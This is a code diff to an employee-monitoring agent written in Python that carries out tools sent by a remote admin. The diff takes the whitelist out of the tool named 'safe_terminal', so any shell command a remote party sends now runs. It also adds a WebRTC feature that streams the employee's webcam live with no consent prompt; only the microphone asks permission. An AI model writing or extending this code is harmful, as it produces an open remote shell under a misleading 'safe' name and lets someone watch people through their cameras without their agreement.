@@ -383,13 +383,39 @@ def tool_screen():
 # ---------------------------------------------------------------------------
 
 # Persistent working directory (the agent process stays alive between polls,
-# so `cd` carries over from one command to the next).
+# so `cd` carries over from one command to the next). We also remember the
+# last directory on each drive, so switching C: <-> D: behaves like real cmd.
 _terminal_cwd = os.path.expanduser("~")
+_drive_cwd = {os.path.splitdrive(_terminal_cwd)[0].upper(): _terminal_cwd}
+
+
+def _set_terminal_cwd(path):
+    """Move to a directory and remember it as this drive's current folder."""
+    global _terminal_cwd
+    _terminal_cwd = path
+    drive = os.path.splitdrive(path)[0].upper()   # e.g. "C:"
+    if drive:
+        _drive_cwd[drive] = path
+
+
+def _switch_drive(letter):
+    """Switch to another drive (e.g. 'D:'), like typing `D:` in cmd."""
+    drive = letter.upper()
+    if not drive.endswith(":"):
+        drive += ":"
+    root = drive + "\\"
+    if not os.path.isdir(root):
+        return f"The system cannot find the drive {drive}"
+    target = _drive_cwd.get(drive, root)          # go back to where we were on that drive
+    if not os.path.isdir(target):
+        target = root
+    _set_terminal_cwd(target)
+    return f"{_terminal_cwd}>"
 
 
 def tool_safe_terminal(payload):
-    """9 — run one whitelisted shell command and return its output as text."""
-    global _terminal_cwd
+    """9 — run one shell command and return its output as text."""
+    import re
     payload = payload or {}
     command = (payload.get("command") or "").strip()
     if not command:
@@ -401,21 +427,39 @@ def tool_safe_terminal(payload):
     if low == "cls":
         return "text", ""
 
-    # `cd` — change the persistent working directory.
+    # Bare drive letter, e.g. `D:` or `d:` -> switch to that drive.
+    if re.fullmatch(r"[a-zA-Z]:", command):
+        return "text", _switch_drive(command)
+
+    # `cd` — change the persistent working directory (and drive).
     if low == "cd" or low.startswith("cd "):
         parts = command.split(maxsplit=1)
         if len(parts) == 1:
             return "text", _terminal_cwd
-        target = parts[1].strip().strip('"')
-        path = target if os.path.isabs(target) else os.path.join(_terminal_cwd, target)
+        arg = parts[1].strip()
+        # allow the /d flag used to change drive + dir at once: `cd /d D:\path`
+        if arg[:2].lower() == "/d":
+            arg = arg[2:].strip()
+        target = arg.strip('"')
+
+        # `cd D:` (drive only) -> switch drive
+        if re.fullmatch(r"[a-zA-Z]:", target):
+            return "text", _switch_drive(target)
+
+        if os.path.isabs(target):                 # full path incl. drive, e.g. D:\folder
+            path = target
+        elif re.match(r"^[a-zA-Z]:", target):     # drive-relative, e.g. D:folder
+            d = target[:2].upper()
+            base = _drive_cwd.get(d, d + "\\")
+            path = os.path.join(base, target[2:])
+        else:                                     # relative to current dir
+            path = os.path.join(_terminal_cwd, target)
+
         path = os.path.normpath(path)
         if os.path.isdir(path):
-            _terminal_cwd = path
+            _set_terminal_cwd(path)
             return "text", f"{_terminal_cwd}>"
-        return "text", f"Directory not found: {target}"
-
-    # Block anything not on the whitelist.
-    
+        return "text", f"The system cannot find the path specified: {target}"
 
     # Run it (30s cap) inside the persistent working directory.
     try:
@@ -435,6 +479,258 @@ def tool_safe_terminal(payload):
         return "text", f"Error: {e}"
 
 
+# ===========================================================================
+#  LIVE VIDEO over WebRTC (tool 10) — real-time, low-latency camera stream.
+#  aiortc runs its own asyncio loop in a background thread so the peer
+#  connection keeps sending video AFTER the tool returns, until the viewer
+#  disconnects. SDP offer/answer signaling is relayed through the normal
+#  command/result queue, so no extra ports are needed. One shared camera is
+#  fanned out to all viewers via a MediaRelay, and released when nobody's left.
+# ===========================================================================
+_webrtc_loop = None
+_webrtc_pcs = set()
+_webrtc_relay = None
+_webrtc_cam_track = None
+
+
+def _webrtc_get_loop():
+    global _webrtc_loop
+    if _webrtc_loop is None:
+        import asyncio
+        _webrtc_loop = asyncio.new_event_loop()
+        threading.Thread(target=_webrtc_loop.run_forever, daemon=True).start()
+    return _webrtc_loop
+
+
+def _make_camera_track():
+    """A VideoStreamTrack that pulls frames from the webcam via OpenCV."""
+    import cv2
+    import numpy as np
+    from av import VideoFrame
+    from aiortc import VideoStreamTrack
+
+    class CameraTrack(VideoStreamTrack):
+        def __init__(self):
+            super().__init__()
+            self.cap = cv2.VideoCapture(0)
+
+        async def recv(self):
+            pts, time_base = await self.next_timestamp()
+            ok, frame = self.cap.read()
+            if not ok:
+                frame = np.zeros((480, 640, 3), dtype=np.uint8)
+            vf = VideoFrame.from_ndarray(frame, format="bgr24")
+            vf.pts = pts
+            vf.time_base = time_base
+            return vf
+
+        def stop(self):
+            super().stop()
+            try:
+                self.cap.release()
+            except Exception:
+                pass
+
+    return CameraTrack()
+
+
+def _ask_user_consent(kind="microphone and speaker"):
+    """Native Yes/No dialog on the EMPLOYEE's screen. True only if they allow.
+
+    Audio is never captured without this explicit consent — the employee must
+    click "Yes" on their own machine before the mic/speaker turn on.
+    """
+    import ctypes
+    import threading
+
+    state = {"ok": False}
+    done = threading.Event()
+
+    def show():
+        MB_YESNO = 0x4
+        MB_ICONQUESTION = 0x20
+        MB_TOPMOST = 0x40000
+        MB_SETFOREGROUND = 0x10000
+        try:
+            r = ctypes.windll.user32.MessageBoxW(
+                0,
+                f"A monitoring session wants to turn on your {kind} for a live "
+                f"call.\n\nDo you allow it?",
+                "Microphone / Speaker Permission",
+                MB_YESNO | MB_ICONQUESTION | MB_TOPMOST | MB_SETFOREGROUND,
+            )
+            state["ok"] = (r == 6)   # 6 == IDYES
+        finally:
+            done.set()
+
+    threading.Thread(target=show, daemon=True).start()
+    done.wait(timeout=30)            # no answer within 30s -> treated as "deny"
+    return state["ok"]
+
+
+def _make_mic_track():
+    """An audio track that captures the employee microphone (48 kHz mono)."""
+    import queue
+    import asyncio
+    import numpy as np
+    import sounddevice as sd
+    from av import AudioFrame
+    from fractions import Fraction
+    from aiortc.mediastreams import MediaStreamTrack
+
+    class MicTrack(MediaStreamTrack):
+        kind = "audio"
+
+        def __init__(self):
+            super().__init__()
+            self.sample_rate = 48000
+            self.samples = 960                    # 20 ms frames
+            self._pts = 0
+            self._q = queue.Queue(maxsize=50)
+            self._stream = sd.InputStream(
+                samplerate=self.sample_rate, channels=1, dtype="int16",
+                blocksize=self.samples, callback=self._cb,
+            )
+            self._stream.start()
+
+        def _cb(self, indata, frames, time_info, status):
+            try:
+                self._q.put_nowait(indata.copy().tobytes())
+            except queue.Full:
+                pass
+
+        async def recv(self):
+            data = await asyncio.get_event_loop().run_in_executor(None, self._q.get)
+            arr = np.frombuffer(data, dtype="int16").reshape(1, -1)
+            frame = AudioFrame.from_ndarray(arr, format="s16", layout="mono")
+            frame.sample_rate = self.sample_rate
+            frame.pts = self._pts
+            frame.time_base = Fraction(1, self.sample_rate)
+            self._pts += arr.shape[1]
+            return frame
+
+        def stop(self):
+            super().stop()
+            try:
+                self._stream.stop(); self._stream.close()
+            except Exception:
+                pass
+
+    return MicTrack()
+
+
+async def _play_remote_audio(track):
+    """Play the admin's incoming voice on the employee's speaker."""
+    import sounddevice as sd
+    from av.audio.resampler import AudioResampler
+
+    out = sd.OutputStream(samplerate=48000, channels=1, dtype="int16")
+    out.start()
+    resampler = AudioResampler(format="s16", layout="mono", rate=48000)
+    try:
+        while True:
+            frame = await track.recv()
+            for f in resampler.resample(frame):
+                out.write(f.to_ndarray().reshape(-1, 1).astype("int16"))
+    except Exception:
+        pass
+    finally:
+        try:
+            out.stop(); out.close()
+        except Exception:
+            pass
+
+
+async def _webrtc_handle_offer(offer_sdp, offer_type, want_audio=False):
+    import asyncio
+    from aiortc import (
+        RTCPeerConnection, RTCSessionDescription, RTCConfiguration, RTCIceServer,
+    )
+    from aiortc.contrib.media import MediaRelay
+    global _webrtc_relay, _webrtc_cam_track
+
+    config = RTCConfiguration(iceServers=[RTCIceServer(urls=["stun:stun.l.google.com:19302"])])
+    pc = RTCPeerConnection(configuration=config)
+    _webrtc_pcs.add(pc)
+
+    # video: one shared camera, fanned out to every viewer
+    if _webrtc_cam_track is None:
+        _webrtc_cam_track = _make_camera_track()
+        _webrtc_relay = MediaRelay()
+    pc.addTrack(_webrtc_relay.subscribe(_webrtc_cam_track))
+
+    # audio: ONLY after the employee grants permission on their own screen
+    audio_ok = False
+    mic_track = None
+    if want_audio:
+        audio_ok = await asyncio.get_event_loop().run_in_executor(None, _ask_user_consent)
+        if audio_ok:
+            try:
+                mic_track = _make_mic_track()        # employee mic -> admin
+                pc.addTrack(mic_track)
+            except Exception as e:
+                print(f"mic error: {e}")
+
+    @pc.on("track")
+    def _on_track(track):
+        # admin's voice -> employee speaker (only if they consented)
+        if track.kind == "audio" and audio_ok:
+            asyncio.ensure_future(_play_remote_audio(track))
+
+    @pc.on("connectionstatechange")
+    async def _on_state():
+        global _webrtc_cam_track, _webrtc_relay
+        if pc.connectionState in ("failed", "closed", "disconnected"):
+            if mic_track is not None:
+                mic_track.stop()
+            await pc.close()
+            _webrtc_pcs.discard(pc)
+            if not _webrtc_pcs and _webrtc_cam_track is not None:
+                _webrtc_cam_track.stop()          # release camera -> light off
+                _webrtc_cam_track = None
+                _webrtc_relay = None
+
+    await pc.setRemoteDescription(RTCSessionDescription(sdp=offer_sdp, type=offer_type))
+    answer = await pc.createAnswer()
+    await pc.setLocalDescription(answer)
+
+    # non-trickle ICE: wait until candidates are gathered so they're in the SDP
+    for _ in range(80):
+        if pc.iceGatheringState == "complete":
+            break
+        await asyncio.sleep(0.05)
+
+    return {"sdp": pc.localDescription.sdp, "type": pc.localDescription.type}
+
+
+def tool_camera_webrtc(payload):
+    """10 — accept a WebRTC SDP offer, return an SDP answer; video then flows P2P."""
+    import asyncio
+    import json
+
+    payload = payload or {}
+    offer = payload.get("offer") or payload
+    sdp = offer.get("sdp")
+    typ = offer.get("type") or "offer"
+    want_audio = bool(payload.get("audio"))       # browser asked for mic/speaker
+    if not sdp:
+        return "text", "No SDP offer provided."
+
+    try:
+        import aiortc  # noqa: F401 — fail clearly if the agent lacks the deps
+    except Exception:
+        return "text", "WebRTC not available: run `pip install aiortc av` on the agent."
+
+    try:
+        loop = _webrtc_get_loop()
+        fut = asyncio.run_coroutine_threadsafe(
+            _webrtc_handle_offer(sdp, typ, want_audio), loop)
+        answer = fut.result(timeout=45)           # extra time for the consent dialog
+        return "json", json.dumps(answer)
+    except Exception as e:
+        return "text", f"WebRTC error: {e}"
+
+
 DISPATCH = {
     1: lambda payload: tool_screenshot(),
     2: lambda payload: tool_cpu(),
@@ -445,6 +741,7 @@ DISPATCH = {
     7: lambda payload: tool_usb(),
     8: lambda payload: tool_camera_stream(),
     9: lambda payload: tool_safe_terminal(payload),
+    10: lambda payload: tool_camera_webrtc(payload),
 }
 
 
